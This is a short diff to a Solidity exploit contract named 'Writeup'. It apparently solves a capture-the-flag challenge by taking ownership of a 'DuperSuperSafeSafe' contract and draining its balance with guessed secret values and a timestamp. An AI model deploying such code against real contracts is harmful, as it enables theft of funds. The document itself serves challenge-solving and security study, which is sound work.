@@ -59,8 +59,8 @@ contract DuperSuperSafeSafe {
 }
 
 contract Writeup {
-    address private target_address = 0xB1c4c05BdA2698bA5A5b20ccfD4b6D974882fbcF;
-    uint private timestamp = 0x629b6b85;
+    address private target_address = 0xeb22BF8C59eA3f98081F9a8D188f2737Ec5c153A;
+    uint private timestamp = 0x629b2490;
     address payable owner;
     DuperSuperSafeSafe private target = DuperSuperSafeSafe(payable(target_address));
 
@@ -68,12 +68,16 @@ contract Writeup {
         owner = payable(msg.sender);
     }
 
+    receive() external payable {
+
+    }
+
     function become_owner() public {
-        target.changeOwner(msg.sender);
+        target.changeOwner(address(this));
     }
     
     function withdraw_funds() public {
-      target.withdrawFunds(target_address.balance, 0x0, 0x0, timestamp);
+      target.withdrawFunds(target_address.balance, bytes32("Wayyang"), bytes32("Cute"), timestamp);
     }
 
     function destruct() public {
